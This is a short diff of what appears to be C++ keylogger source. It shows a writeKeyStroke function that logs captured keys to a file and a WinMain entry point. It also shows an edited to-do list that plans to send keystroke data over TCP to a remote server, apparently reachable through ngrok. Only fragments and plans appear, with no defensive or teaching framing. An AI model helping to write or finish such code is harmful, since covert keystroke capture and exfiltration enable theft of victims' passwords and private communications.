@@ -26,7 +26,7 @@ void writeKeyStroke(int trueKey)
     if (trueKey == ENTER)
     {
         file << "\n";
-    }
+    } 
     else 
     {
         file << static_cast<char>(trueKey);
@@ -84,10 +84,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     To-Do list
 
     in ks2server.cpp:
-    ~ ensure all code is written safely and clearly, check for variable names and provide more explanation in documentation for the choice of filename "ks2server.cpp".
-    ~ check and see if client() is able to connect to an ngrok server and port.
-    ~ provide clear explanations to user for any if statements checking for any WSA errors.
-    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
-    ~ figure out why getaddrinfo() is not working in ks2server.cpp 
-
+    ~ check documentation for ALL code files to ensure everything is written clearly, and concisely.
+    ~ maybe seggregate the code that resolves dns to ipv4 format into a separate header file. 
+    ~ write code that sends and recieves keystroke data over the tcp connection.
+    ~ ensure proper spacing between code statements to improve readability.
+    ~ check if HOST in ks2server.cpp is equal to a domain name or ipv4 address so that we can resolve accordingly.
 */
